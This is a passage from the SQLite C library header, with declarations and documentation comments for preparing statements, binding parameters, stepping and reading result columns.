** the extra prepFlags parameter, which is a bit array consisting of zero or
** more of the [SQLITE_PREPARE_PERSISTENT|SQLITE_PREPARE_*] flags.  ^The
** sqlite3_prepare_v2() interface works exactly the same as
** sqlite3_prepare_v3() with a zero prepFlags parameter.
*/
SQLITE_API int sqlite3_prepare(
  sqlite3 *db,            /* Database handle */
  const char *zSql,       /* SQL statement, UTF-8 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const char **pzTail     /* OUT: Pointer to unused portion of zSql */
);
SQLITE_API int sqlite3_prepare_v2(
  sqlite3 *db,            /* Database handle */
  const char *zSql,       /* SQL statement, UTF-8 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const char **pzTail     /* OUT: Pointer to unused portion of zSql */
);
SQLITE_API int sqlite3_prepare_v3(
  sqlite3 *db,            /* Database handle */
  const char *zSql,       /* SQL statement, UTF-8 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  unsigned int prepFlags, /* Zero or more SQLITE_PREPARE_ flags */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const char **pzTail     /* OUT: Pointer to unused portion of zSql */
);
SQLITE_API int sqlite3_prepare16(
  sqlite3 *db,            /* Database handle */
  const void *zSql,       /* SQL statement, UTF-16 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const void **pzTail     /* OUT: Pointer to unused portion of zSql */
);
SQLITE_API int sqlite3_prepare16_v2(
  sqlite3 *db,            /* Database handle */
  const void *zSql,       /* SQL statement, UTF-16 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const void **pzTail     /* OUT: Pointer to unused portion of zSql */
);
SQLITE_API int sqlite3_prepare16_v3(
  sqlite3 *db,            /* Database handle */
  const void *zSql,       /* SQL statement, UTF-16 encoded */
  int nByte,              /* Maximum length of zSql in bytes. */
  unsigned int prepFlags, /* Zero or more SQLITE_PREPARE_ flags */
  sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
  const void **pzTail     /* OUT: Pointer to unused portion of zSql */
);

/*
** CAPI3REF: Retrieving Statement SQL
** METHOD: sqlite3_stmt
**
** ^The sqlite3_sql(P) interface returns a pointer to a copy of the UTF-8
** SQL text used to create [prepared statement] P if P was
** created by [sqlite3_prepare_v2()], [sqlite3_prepare_v3()],
** [sqlite3_prepare16_v2()], or [sqlite3_prepare16_v3()].
** ^The sqlite3_expanded_sql(P) interface returns a pointer to a UTF-8
** string containing the SQL text of prepared statement P with
** [bound parameters] expanded.
** ^The sqlite3_normalized_sql(P) interface returns a pointer to a UTF-8
** string containing the normalized SQL text of prepared statement P.  The
** semantics used to normalize a SQL statement are unspecified and subject
** to change.  At a minimum, literal values will be replaced with suitable
** placeholders.
**
** ^(For example, if a prepared statement is created using the SQL
** text "SELECT $abc,:xyz" and if parameter $abc is bound to integer 2345
** and parameter :xyz is unbound, then sqlite3_sql() will return
** the original string, "SELECT $abc,:xyz" but sqlite3_expanded_sql()
** will return "SELECT 2345,NULL".)^
**
** ^The sqlite3_expanded_sql() interface returns NULL if insufficient memory
** is available to hold the result, or if the result would exceed the
** the maximum string length determined by the [SQLITE_LIMIT_LENGTH].
**
** ^The [SQLITE_TRACE_SIZE_LIMIT] compile-time option limits the size of
** bound parameter expansions.  ^The [SQLITE_OMIT_TRACE] compile-time
** option causes sqlite3_expanded_sql() to always return NULL.
**
** ^The strings returned by sqlite3_sql(P) and sqlite3_normalized_sql(P)
** are managed by SQLite and are automatically freed when the prepared
** statement is finalized.
** ^The string returned by sqlite3_expanded_sql(P), on the other hand,
** is obtained from [sqlite3_malloc()] and must be free by the application
** by passing it to [sqlite3_free()].
*/
SQLITE_API const char *sqlite3_sql(sqlite3_stmt *pStmt);
SQLITE_API char *sqlite3_expanded_sql(sqlite3_stmt *pStmt);
SQLITE_API const char *sqlite3_normalized_sql(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Determine If An SQL Statement Writes The Database
** METHOD: sqlite3_stmt
**
** ^The sqlite3_stmt_readonly(X) interface returns true (non-zero) if
** and only if the [prepared statement] X makes no direct changes to
** the content of the database file.
**
** Note that [application-defined SQL functions] or
** [virtual tables] might change the database indirectly as a side effect.  
** ^(For example, if an application defines a function "eval()" that 
** calls [sqlite3_exec()], then the following SQL statement would
** change the database file through side-effects:
**
** <blockquote><pre>
**    SELECT eval('DELETE FROM t1') FROM t2;
** </pre></blockquote>
**
** But because the [SELECT] statement does not change the database file
** directly, sqlite3_stmt_readonly() would still return true.)^
**
** ^Transaction control statements such as [BEGIN], [COMMIT], [ROLLBACK],
** [SAVEPOINT], and [RELEASE] cause sqlite3_stmt_readonly() to return true,
** since the statements themselves do not actually modify the database but
** rather they control the timing of when other statements modify the 
** database.  ^The [ATTACH] and [DETACH] statements also cause
** sqlite3_stmt_readonly() to return true since, while those statements
** change the configuration of a database connection, they do not make 
** changes to the content of the database files on disk.
** ^The sqlite3_stmt_readonly() interface returns true for [BEGIN] since
** [BEGIN] merely sets internal flags, but the [BEGIN|BEGIN IMMEDIATE] and
** [BEGIN|BEGIN EXCLUSIVE] commands do touch the database and so
** sqlite3_stmt_readonly() returns false for those commands.
*/
SQLITE_API int sqlite3_stmt_readonly(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Query The EXPLAIN Setting For A Prepared Statement
** METHOD: sqlite3_stmt
**
** ^The sqlite3_stmt_isexplain(S) interface returns 1 if the
** prepared statement S is an EXPLAIN statement, or 2 if the
** statement S is an EXPLAIN QUERY PLAN.
** ^The sqlite3_stmt_isexplain(S) interface returns 0 if S is
** an ordinary statement or a NULL pointer.
*/
SQLITE_API int sqlite3_stmt_isexplain(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Determine If A Prepared Statement Has Been Reset
** METHOD: sqlite3_stmt
**
** ^The sqlite3_stmt_busy(S) interface returns true (non-zero) if the
** [prepared statement] S has been stepped at least once using 
** [sqlite3_step(S)] but has neither run to completion (returned
** [SQLITE_DONE] from [sqlite3_step(S)]) nor
** been reset using [sqlite3_reset(S)].  ^The sqlite3_stmt_busy(S)
** interface returns false if S is a NULL pointer.  If S is not a 
** NULL pointer and is not a pointer to a valid [prepared statement]
** object, then the behavior is undefined and probably undesirable.
**
** This interface can be used in combination [sqlite3_next_stmt()]
** to locate all prepared statements associated with a database 
** connection that are in need of being reset.  This can be used,
** for example, in diagnostic routines to search for prepared 
** statements that are holding a transaction open.
*/
SQLITE_API int sqlite3_stmt_busy(sqlite3_stmt*);

/*
** CAPI3REF: Dynamically Typed Value Object
** KEYWORDS: {protected sqlite3_value} {unprotected sqlite3_value}
**
** SQLite uses the sqlite3_value object to represent all values
** that can be stored in a database table. SQLite uses dynamic typing
** for the values it stores.  ^Values stored in sqlite3_value objects
** can be integers, floating point values, strings, BLOBs, or NULL.
**
** An sqlite3_value object may be either "protected" or "unprotected".
** Some interfaces require a protected sqlite3_value.  Other interfaces
** will accept either a protected or an unprotected sqlite3_value.
** Every interface that accepts sqlite3_value arguments specifies
** whether or not it requires a protected sqlite3_value.  The
** [sqlite3_value_dup()] interface can be used to construct a new 
** protected sqlite3_value from an unprotected sqlite3_value.
**
** The terms "protected" and "unprotected" refer to whether or not
** a mutex is held.  An internal mutex is held for a protected
** sqlite3_value object but no mutex is held for an unprotected
** sqlite3_value object.  If SQLite is compiled to be single-threaded
** (with [SQLITE_THREADSAFE=0] and with [sqlite3_threadsafe()] returning 0)
** or if SQLite is run in one of reduced mutex modes 
** [SQLITE_CONFIG_SINGLETHREAD] or [SQLITE_CONFIG_MULTITHREAD]
** then there is no distinction between protected and unprotected
** sqlite3_value objects and they can be used interchangeably.  However,
** for maximum code portability it is recommended that applications
** still make the distinction between protected and unprotected
** sqlite3_value objects even when not strictly required.
**
** ^The sqlite3_value objects that are passed as parameters into the
** implementation of [application-defined SQL functions] are protected.
** ^The sqlite3_value object returned by
** [sqlite3_column_value()] is unprotected.
** Unprotected sqlite3_value objects may only be used as arguments
** to [sqlite3_result_value()], [sqlite3_bind_value()], and
** [sqlite3_value_dup()].
** The [sqlite3_value_blob | sqlite3_value_type()] family of
** interfaces require protected sqlite3_value objects.
*/
typedef struct sqlite3_value sqlite3_value;

/*
** CAPI3REF: SQL Function Context Object
**
** The context in which an SQL function executes is stored in an
** sqlite3_context object.  ^A pointer to an sqlite3_context object
** is always first parameter to [application-defined SQL functions].
** The application-defined SQL function implementation will pass this
** pointer through into calls to [sqlite3_result_int | sqlite3_result()],
** [sqlite3_aggregate_context()], [sqlite3_user_data()],
** [sqlite3_context_db_handle()], [sqlite3_get_auxdata()],
** and/or [sqlite3_set_auxdata()].
*/
typedef struct sqlite3_context sqlite3_context;

/*
** CAPI3REF: Binding Values To Prepared Statements
** KEYWORDS: {host parameter} {host parameters} {host parameter name}
** KEYWORDS: {SQL parameter} {SQL parameters} {parameter binding}
** METHOD: sqlite3_stmt
**
** ^(In the SQL statement text input to [sqlite3_prepare_v2()] and its variants,
** literals may be replaced by a [parameter] that matches one of following
** templates:
**
** <ul>
** <li>  ?
** <li>  ?NNN
** <li>  :VVV
** <li>  @VVV
** <li>  $VVV
** </ul>
**
** In the templates above, NNN represents an integer literal,
** and VVV represents an alphanumeric identifier.)^  ^The values of these
** parameters (also called "host parameter names" or "SQL parameters")
** can be set using the sqlite3_bind_*() routines defined here.
**
** ^The first argument to the sqlite3_bind_*() routines is always
** a pointer to the [sqlite3_stmt] object returned from
** [sqlite3_prepare_v2()] or its variants.
**
** ^The second argument is the index of the SQL parameter to be set.
** ^The leftmost SQL parameter has an index of 1.  ^When the same named
** SQL parameter is used more than once, second and subsequent
** occurrences have the same index as the first occurrence.
** ^The index for named parameters can be looked up using the
** [sqlite3_bind_parameter_index()] API if desired.  ^The index
** for "?NNN" parameters is the value of NNN.
** ^The NNN value must be between 1 and the [sqlite3_limit()]
** parameter [SQLITE_LIMIT_VARIABLE_NUMBER] (default value: 999).
**
** ^The third argument is the value to bind to the parameter.
** ^If the third parameter to sqlite3_bind_text() or sqlite3_bind_text16()
** or sqlite3_bind_blob() is a NULL pointer then the fourth parameter
** is ignored and the end result is the same as sqlite3_bind_null().
**
** ^(In those routines that have a fourth argument, its value is the
** number of bytes in the parameter.  To be clear: the value is the
** number of <u>bytes</u> in the value, not the number of characters.)^
** ^If the fourth parameter to sqlite3_bind_text() or sqlite3_bind_text16()
** is negative, then the length of the string is
** the number of bytes up to the first zero terminator.
** If the fourth parameter to sqlite3_bind_blob() is negative, then
** the behavior is undefined.
** If a non-negative fourth parameter is provided to sqlite3_bind_text()
** or sqlite3_bind_text16() or sqlite3_bind_text64() then
** that parameter must be the byte offset
** where the NUL terminator would occur assuming the string were NUL
** terminated.  If any NUL characters occur at byte offsets less than 
** the value of the fourth parameter then the resulting string value will
** contain embedded NULs.  The result of expressions involving strings
** with embedded NULs is undefined.
**
** ^The fifth argument to the BLOB and string binding interfaces
** is a destructor used to dispose of the BLOB or
** string after SQLite has finished with it.  ^The destructor is called
** to dispose of the BLOB or string even if the call to the bind API fails,
** except the destructor is not called if the third parameter is a NULL
** pointer or the fourth parameter is negative.
** ^If the fifth argument is
** the special value [SQLITE_STATIC], then SQLite assumes that the
** information is in static, unmanaged space and does not need to be freed.
** ^If the fifth argument has the value [SQLITE_TRANSIENT], then
** SQLite makes its own private copy of the data immediately, before
** the sqlite3_bind_*() routine returns.
**
** ^The sixth argument to sqlite3_bind_text64() must be one of
** [SQLITE_UTF8], [SQLITE_UTF16], [SQLITE_UTF16BE], or [SQLITE_UTF16LE]
** to specify the encoding of the text in the third parameter.  If
** the sixth argument to sqlite3_bind_text64() is not one of the
** allowed values shown above, or if the text encoding is different
** from the encoding specified by the sixth parameter, then the behavior
** is undefined.
**
** ^The sqlite3_bind_zeroblob() routine binds a BLOB of length N that
** is filled with zeroes.  ^A zeroblob uses a fixed amount of memory
** (just an integer to hold its size) while it is being processed.
** Zeroblobs are intended to serve as placeholders for BLOBs whose
** content is later written using
** [sqlite3_blob_open | incremental BLOB I/O] routines.
** ^A negative value for the zeroblob results in a zero-length BLOB.
**
** ^The sqlite3_bind_pointer(S,I,P,T,D) routine causes the I-th parameter in
** [prepared statement] S to have an SQL value of NULL, but to also be
** associated with the pointer P of type T.  ^D is either a NULL pointer or
** a pointer to a destructor function for P. ^SQLite will invoke the
** destructor D with a single argument of P when it is finished using
** P.  The T parameter should be a static string, preferably a string
** literal. The sqlite3_bind_pointer() routine is part of the
** [pointer passing interface] added for SQLite 3.20.0.
**
** ^If any of the sqlite3_bind_*() routines are called with a NULL pointer
** for the [prepared statement] or with a prepared statement for which
** [sqlite3_step()] has been called more recently than [sqlite3_reset()],
** then the call will return [SQLITE_MISUSE].  If any sqlite3_bind_()
** routine is passed a [prepared statement] that has been finalized, the
** result is undefined and probably harmful.
**
** ^Bindings are not cleared by the [sqlite3_reset()] routine.
** ^Unbound parameters are interpreted as NULL.
**
** ^The sqlite3_bind_* routines return [SQLITE_OK] on success or an
** [error code] if anything goes wrong.
** ^[SQLITE_TOOBIG] might be returned if the size of a string or BLOB
** exceeds limits imposed by [sqlite3_limit]([SQLITE_LIMIT_LENGTH]) or
** [SQLITE_MAX_LENGTH].
** ^[SQLITE_RANGE] is returned if the parameter
** index is out of range.  ^[SQLITE_NOMEM] is returned if malloc() fails.
**
** See also: [sqlite3_bind_parameter_count()],
** [sqlite3_bind_parameter_name()], and [sqlite3_bind_parameter_index()].
*/
SQLITE_API int sqlite3_bind_blob(sqlite3_stmt*, int, const void*, int n, void(*)(void*));
SQLITE_API int sqlite3_bind_blob64(sqlite3_stmt*, int, const void*, sqlite3_uint64,
                        void(*)(void*));
SQLITE_API int sqlite3_bind_double(sqlite3_stmt*, int, double);
SQLITE_API int sqlite3_bind_int(sqlite3_stmt*, int, int);
SQLITE_API int sqlite3_bind_int64(sqlite3_stmt*, int, sqlite3_int64);
SQLITE_API int sqlite3_bind_null(sqlite3_stmt*, int);
SQLITE_API int sqlite3_bind_text(sqlite3_stmt*,int,const char*,int,void(*)(void*));
SQLITE_API int sqlite3_bind_text16(sqlite3_stmt*, int, const void*, int, void(*)(void*));
SQLITE_API int sqlite3_bind_text64(sqlite3_stmt*, int, const char*, sqlite3_uint64,
                         void(*)(void*), unsigned char encoding);
SQLITE_API int sqlite3_bind_value(sqlite3_stmt*, int, const sqlite3_value*);
SQLITE_API int sqlite3_bind_pointer(sqlite3_stmt*, int, void*, const char*,void(*)(void*));
SQLITE_API int sqlite3_bind_zeroblob(sqlite3_stmt*, int, int n);
SQLITE_API int sqlite3_bind_zeroblob64(sqlite3_stmt*, int, sqlite3_uint64);

/*
** CAPI3REF: Number Of SQL Parameters
** METHOD: sqlite3_stmt
**
** ^This routine can be used to find the number of [SQL parameters]
** in a [prepared statement].  SQL parameters are tokens of the
** form "?", "?NNN", ":AAA", "$AAA", or "@AAA" that serve as
** placeholders for values that are [sqlite3_bind_blob | bound]
** to the parameters at a later time.
**
** ^(This routine actually returns the index of the largest (rightmost)
** parameter. For all forms except ?NNN, this will correspond to the
** number of unique parameters.  If parameters of the ?NNN form are used,
** there may be gaps in the list.)^
**
** See also: [sqlite3_bind_blob|sqlite3_bind()],
** [sqlite3_bind_parameter_name()], and
** [sqlite3_bind_parameter_index()].
*/
SQLITE_API int sqlite3_bind_parameter_count(sqlite3_stmt*);

/*
** CAPI3REF: Name Of A Host Parameter
** METHOD: sqlite3_stmt
**
** ^The sqlite3_bind_parameter_name(P,N) interface returns
** the name of the N-th [SQL parameter] in the [prepared statement] P.
** ^(SQL parameters of the form "?NNN" or ":AAA" or "@AAA" or "$AAA"
** have a name which is the string "?NNN" or ":AAA" or "@AAA" or "$AAA"
** respectively.
** In other words, the initial ":" or "$" or "@" or "?"
** is included as part of the name.)^
** ^Parameters of the form "?" without a following integer have no name
** and are referred to as "nameless" or "anonymous parameters".
**
** ^The first host parameter has an index of 1, not 0.
**
** ^If the value N is out of range or if the N-th parameter is
** nameless, then NULL is returned.  ^The returned string is
** always in UTF-8 encoding even if the named parameter was
** originally specified as UTF-16 in [sqlite3_prepare16()],
** [sqlite3_prepare16_v2()], or [sqlite3_prepare16_v3()].
**
** See also: [sqlite3_bind_blob|sqlite3_bind()],
** [sqlite3_bind_parameter_count()], and
** [sqlite3_bind_parameter_index()].
*/
SQLITE_API const char *sqlite3_bind_parameter_name(sqlite3_stmt*, int);

/*
** CAPI3REF: Index Of A Parameter With A Given Name
** METHOD: sqlite3_stmt
**
** ^Return the index of an SQL parameter given its name.  ^The
** index value returned is suitable for use as the second
** parameter to [sqlite3_bind_blob|sqlite3_bind()].  ^A zero
** is returned if no matching parameter is found.  ^The parameter
** name must be given in UTF-8 even if the original statement
** was prepared from UTF-16 text using [sqlite3_prepare16_v2()] or
** [sqlite3_prepare16_v3()].
**
** See also: [sqlite3_bind_blob|sqlite3_bind()],
** [sqlite3_bind_parameter_count()], and
** [sqlite3_bind_parameter_name()].
*/
SQLITE_API int sqlite3_bind_parameter_index(sqlite3_stmt*, const char *zName);

/*
** CAPI3REF: Reset All Bindings On A Prepared Statement
** METHOD: sqlite3_stmt
**
** ^Contrary to the intuition of many, [sqlite3_reset()] does not reset
** the [sqlite3_bind_blob | bindings] on a [prepared statement].
** ^Use this routine to reset all host parameters to NULL.
*/
SQLITE_API int sqlite3_clear_bindings(sqlite3_stmt*);

/*
** CAPI3REF: Number Of Columns In A Result Set
** METHOD: sqlite3_stmt
**
** ^Return the number of columns in the result set returned by the
** [prepared statement]. ^If this routine returns 0, that means the 
** [prepared statement] returns no data (for example an [UPDATE]).
** ^However, just because this routine returns a positive number does not
** mean that one or more rows of data will be returned.  ^A SELECT statement
** will always have a positive sqlite3_column_count() but depending on the
** WHERE clause constraints and the table content, it might return no rows.
**
** See also: [sqlite3_data_count()]
*/
SQLITE_API int sqlite3_column_count(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Column Names In A Result Set
** METHOD: sqlite3_stmt
**
** ^These routines return the name assigned to a particular column
** in the result set of a [SELECT] statement.  ^The sqlite3_column_name()
** interface returns a pointer to a zero-terminated UTF-8 string
** and sqlite3_column_name16() returns a pointer to a zero-terminated
** UTF-16 string.  ^The first parameter is the [prepared statement]
** that implements the [SELECT] statement. ^The second parameter is the
** column number.  ^The leftmost column is number 0.
**
** ^The returned string pointer is valid until either the [prepared statement]
** is destroyed by [sqlite3_finalize()] or until the statement is automatically
** reprepared by the first call to [sqlite3_step()] for a particular run
** or until the next call to
** sqlite3_column_name() or sqlite3_column_name16() on the same column.
**
** ^If sqlite3_malloc() fails during the processing of either routine
** (for example during a conversion from UTF-8 to UTF-16) then a
** NULL pointer is returned.
**
** ^The name of a result column is the value of the "AS" clause for
** that column, if there is an AS clause.  If there is no AS clause
** then the name of the column is unspecified and may change from
** one release of SQLite to the next.
*/
SQLITE_API const char *sqlite3_column_name(sqlite3_stmt*, int N);
SQLITE_API const void *sqlite3_column_name16(sqlite3_stmt*, int N);

/*
** CAPI3REF: Source Of Data In A Query Result
** METHOD: sqlite3_stmt
**
** ^These routines provide a means to determine the database, table, and
** table column that is the origin of a particular result column in
** [SELECT] statement.
** ^The name of the database or table or column can be returned as
** either a UTF-8 or UTF-16 string.  ^The _database_ routines return
** the database name, the _table_ routines return the table name, and
** the origin_ routines return the column name.
** ^The returned string is valid until the [prepared statement] is destroyed
** using [sqlite3_finalize()] or until the statement is automatically
** reprepared by the first call to [sqlite3_step()] for a particular run
** or until the same information is requested
** again in a different encoding.
**
** ^The names returned are the original un-aliased names of the
** database, table, and column.
**
** ^The first argument to these interfaces is a [prepared statement].
** ^These functions return information about the Nth result column returned by
** the statement, where N is the second function argument.
** ^The left-most column is column 0 for these routines.
**
** ^If the Nth column returned by the statement is an expression or
** subquery and is not a column value, then all of these functions return
** NULL.  ^These routine might also return NULL if a memory allocation error
** occurs.  ^Otherwise, they return the name of the attached database, table,
** or column that query result column was extracted from.
**
** ^As with all other SQLite APIs, those whose names end with "16" return
** UTF-16 encoded strings and the other functions return UTF-8.
**
** ^These APIs are only available if the library was compiled with the
** [SQLITE_ENABLE_COLUMN_METADATA] C-preprocessor symbol.
**
** If two or more threads call one or more of these routines against the same
** prepared statement and column at the same time then the results are
** undefined.
**
** If two or more threads call one or more
** [sqlite3_column_database_name | column metadata interfaces]
** for the same [prepared statement] and result column
** at the same time then the results are undefined.
*/
SQLITE_API const char *sqlite3_column_database_name(sqlite3_stmt*,int);
SQLITE_API const void *sqlite3_column_database_name16(sqlite3_stmt*,int);
SQLITE_API const char *sqlite3_column_table_name(sqlite3_stmt*,int);
SQLITE_API const void *sqlite3_column_table_name16(sqlite3_stmt*,int);
SQLITE_API const char *sqlite3_column_origin_name(sqlite3_stmt*,int);
SQLITE_API const void *sqlite3_column_origin_name16(sqlite3_stmt*,int);

/*
** CAPI3REF: Declared Datatype Of A Query Result
** METHOD: sqlite3_stmt
**
** ^(The first parameter is a [prepared statement].
** If this statement is a [SELECT] statement and the Nth column of the
** returned result set of that [SELECT] is a table column (not an
** expression or subquery) then the declared type of the table
** column is returned.)^  ^If the Nth column of the result set is an
** expression or subquery, then a NULL pointer is returned.
** ^The returned string is always UTF-8 encoded.
**
** ^(For example, given the database schema:
**
** CREATE TABLE t1(c1 VARIANT);
**
** and the following statement to be compiled:
**
** SELECT c1 + 1, c1 FROM t1;
**
** this routine would return the string "VARIANT" for the second result
** column (i==1), and a NULL pointer for the first result column (i==0).)^
**
** ^SQLite uses dynamic run-time typing.  ^So just because a column
** is declared to contain a particular type does not mean that the
** data stored in that column is of the declared type.  SQLite is
** strongly typed, but the typing is dynamic not static.  ^Type
** is associated with individual values, not with the containers
** used to hold those values.
*/
SQLITE_API const char *sqlite3_column_decltype(sqlite3_stmt*,int);
SQLITE_API const void *sqlite3_column_decltype16(sqlite3_stmt*,int);

/*
** CAPI3REF: Evaluate An SQL Statement
** METHOD: sqlite3_stmt
**
** After a [prepared statement] has been prepared using any of
** [sqlite3_prepare_v2()], [sqlite3_prepare_v3()], [sqlite3_prepare16_v2()],
** or [sqlite3_prepare16_v3()] or one of the legacy
** interfaces [sqlite3_prepare()] or [sqlite3_prepare16()], this function
** must be called one or more times to evaluate the statement.
**
** The details of the behavior of the sqlite3_step() interface depend
** on whether the statement was prepared using the newer "vX" interfaces
** [sqlite3_prepare_v3()], [sqlite3_prepare_v2()], [sqlite3_prepare16_v3()],
** [sqlite3_prepare16_v2()] or the older legacy
** interfaces [sqlite3_prepare()] and [sqlite3_prepare16()].  The use of the
** new "vX" interface is recommended for new applications but the legacy
** interface will continue to be supported.
**
** ^In the legacy interface, the return value will be either [SQLITE_BUSY],
** [SQLITE_DONE], [SQLITE_ROW], [SQLITE_ERROR], or [SQLITE_MISUSE].
** ^With the "v2" interface, any of the other [result codes] or
** [extended result codes] might be returned as well.
**
** ^[SQLITE_BUSY] means that the database engine was unable to acquire the
** database locks it needs to do its job.  ^If the statement is a [COMMIT]
** or occurs outside of an explicit transaction, then you can retry the
** statement.  If the statement is not a [COMMIT] and occurs within an
** explicit transaction then you should rollback the transaction before
** continuing.
**
** ^[SQLITE_DONE] means that the statement has finished executing
** successfully.  sqlite3_step() should not be called again on this virtual
** machine without first calling [sqlite3_reset()] to reset the virtual
** machine back to its initial state.
**
** ^If the SQL statement being executed returns any data, then [SQLITE_ROW]
** is returned each time a new row of data is ready for processing by the
** caller. The values may be accessed using the [column access functions].
** sqlite3_step() is called again to retrieve the next row of data.
**
** ^[SQLITE_ERROR] means that a run-time error (such as a constraint
** violation) has occurred.  sqlite3_step() should not be called again on
** the VM. More information may be found by calling [sqlite3_errmsg()].
** ^With the legacy interface, a more specific error code (for example,
** [SQLITE_INTERRUPT], [SQLITE_SCHEMA], [SQLITE_CORRUPT], and so forth)
** can be obtained by calling [sqlite3_reset()] on the
** [prepared statement].  ^In the "v2" interface,
** the more specific error code is returned directly by sqlite3_step().
**
** [SQLITE_MISUSE] means that the this routine was called inappropriately.
** Perhaps it was called on a [prepared statement] that has
** already been [sqlite3_finalize | finalized] or on one that had
** previously returned [SQLITE_ERROR] or [SQLITE_DONE].  Or it could
** be the case that the same database connection is being used by two or
** more threads at the same moment in time.
**
** For all versions of SQLite up to and including 3.6.23.1, a call to
** [sqlite3_reset()] was required after sqlite3_step() returned anything
** other than [SQLITE_ROW] before any subsequent invocation of
** sqlite3_step().  Failure to reset the prepared statement using 
** [sqlite3_reset()] would result in an [SQLITE_MISUSE] return from
** sqlite3_step().  But after [version 3.6.23.1] ([dateof:3.6.23.1],
** sqlite3_step() began
** calling [sqlite3_reset()] automatically in this circumstance rather
** than returning [SQLITE_MISUSE].  This is not considered a compatibility
** break because any application that ever receives an SQLITE_MISUSE error
** is broken by definition.  The [SQLITE_OMIT_AUTORESET] compile-time option
** can be used to restore the legacy behavior.
**
** <b>Goofy Interface Alert:</b> In the legacy interface, the sqlite3_step()
** API always returns a generic error code, [SQLITE_ERROR], following any
** error other than [SQLITE_BUSY] and [SQLITE_MISUSE].  You must call
** [sqlite3_reset()] or [sqlite3_finalize()] in order to find one of the
** specific [error codes] that better describes the error.
** We admit that this is a goofy design.  The problem has been fixed
** with the "v2" interface.  If you prepare all of your SQL statements
** using [sqlite3_prepare_v3()] or [sqlite3_prepare_v2()]
** or [sqlite3_prepare16_v2()] or [sqlite3_prepare16_v3()] instead
** of the legacy [sqlite3_prepare()] and [sqlite3_prepare16()] interfaces,
** then the more specific [error codes] are returned directly
** by sqlite3_step().  The use of the "vX" interfaces is recommended.
*/
SQLITE_API int sqlite3_step(sqlite3_stmt*);

/*
** CAPI3REF: Number of columns in a result set
** METHOD: sqlite3_stmt
**
** ^The sqlite3_data_count(P) interface returns the number of columns in the
** current row of the result set of [prepared statement] P.
** ^If prepared statement P does not have results ready to return
** (via calls to the [sqlite3_column_int | sqlite3_column_*()] of
** interfaces) then sqlite3_data_count(P) returns 0.
** ^The sqlite3_data_count(P) routine also returns 0 if P is a NULL pointer.
** ^The sqlite3_data_count(P) routine returns 0 if the previous call to
** [sqlite3_step](P) returned [SQLITE_DONE].  ^The sqlite3_data_count(P)
** will return non-zero if previous call to [sqlite3_step](P) returned
** [SQLITE_ROW], except in the case of the [PRAGMA incremental_vacuum]
** where it always returns zero since each step of that multi-step
** pragma returns 0 columns of data.
**
** See also: [sqlite3_column_count()]
*/
SQLITE_API int sqlite3_data_count(sqlite3_stmt *pStmt);

/*
** CAPI3REF: Fundamental Datatypes
** KEYWORDS: SQLITE_TEXT
**
** ^(Every value in SQLite has one of five fundamental datatypes:
**
** <ul>
** <li> 64-bit signed integer
** <li> 64-bit IEEE floating point number
** <li> string
** <li> BLOB
** <li> NULL
** </ul>)^
**
** These constants are codes for each of those types.
**
** Note that the SQLITE_TEXT constant was also used in SQLite version 2
** for a completely different meaning.  Software that links against both
** SQLite version 2 and SQLite version 3 should use SQLITE3_TEXT, not
** SQLITE_TEXT.
*/
#define SQLITE_INTEGER  1
#define SQLITE_FLOAT    2
#define SQLITE_BLOB     4
#define SQLITE_NULL     5
#ifdef SQLITE_TEXT
# undef SQLITE_TEXT
#else
# define SQLITE_TEXT     3
#endif
#define SQLITE3_TEXT     3

/*
** CAPI3REF: Result Values From A Query
** KEYWORDS: {column access functions}
** METHOD: sqlite3_stmt
**
** <b>Summary:</b>
** <blockquote><table border=0 cellpadding=0 cellspacing=0>
** <tr><td><b>sqlite3_column_blob</b><td>&rarr;<td>BLOB result
** <tr><td><b>sqlite3_column_double</b><td>&rarr;<td>REAL result
** <tr><td><b>sqlite3_column_int</b><td>&rarr;<td>32-bit INTEGER result
** <tr><td><b>sqlite3_column_int64</b><td>&rarr;<td>64-bit INTEGER result
** <tr><td><b>sqlite3_column_text</b><td>&rarr;<td>UTF-8 TEXT result
** <tr><td><b>sqlite3_column_text16</b><td>&rarr;<td>UTF-16 TEXT result
** <tr><td><b>sqlite3_column_value</b><td>&rarr;<td>The result as an 
** [sqlite3_value|unprotected sqlite3_value] object.
** <tr><td>&nbsp;<td>&nbsp;<td>&nbsp;
** <tr><td><b>sqlite3_column_bytes</b><td>&rarr;<td>Size of a BLOB
** or a UTF-8 TEXT result in bytes
** <tr><td><b>sqlite3_column_bytes16&nbsp;&nbsp;</b>
** <td>&rarr;&nbsp;&nbsp;<td>Size of UTF-16
** TEXT in bytes
** <tr><td><b>sqlite3_column_type</b><td>&rarr;<td>Default
** datatype of the result
** </table></blockquote>
**
** <b>Details:</b>
**
** ^These routines return information about a single column of the current
** result row of a query.  ^In every case the first argument is a pointer
** to the [prepared statement] that is being evaluated (the [sqlite3_stmt*]
** that was returned from [sqlite3_prepare_v2()] or one of its variants)
** and the second argument is the index of the column for which information
** should be returned. ^The leftmost column of the result set has the index 0.
** ^The number of columns in the result can be determined using
** [sqlite3_column_count()].
**
** If the SQL statement does not currently point to a valid row, or if the
** column index is out of range, the result is undefined.
** These routines may only be called when the most recent call to
** [sqlite3_step()] has returned [SQLITE_ROW] and neither
** [sqlite3_reset()] nor [sqlite3_finalize()] have been called subsequently.
** If any of these routines are called after [sqlite3_reset()] or
** [sqlite3_finalize()] or after [sqlite3_step()] has returned
** something other than [SQLITE_ROW], the results are undefined.
** If [sqlite3_step()] or [sqlite3_reset()] or [sqlite3_finalize()]
** are called from a different thread while any of these routines
** are pending, then the results are undefined.
**
** The first six interfaces (_blob, _double, _int, _int64, _text, and _text16)
** each return the value of a result column in a specific data format.  If
** the result column is not initially in the requested format (for example,
** if the query returns an integer but the sqlite3_column_text() interface
** is used to extract the value) then an automatic type conversion is performed.
**
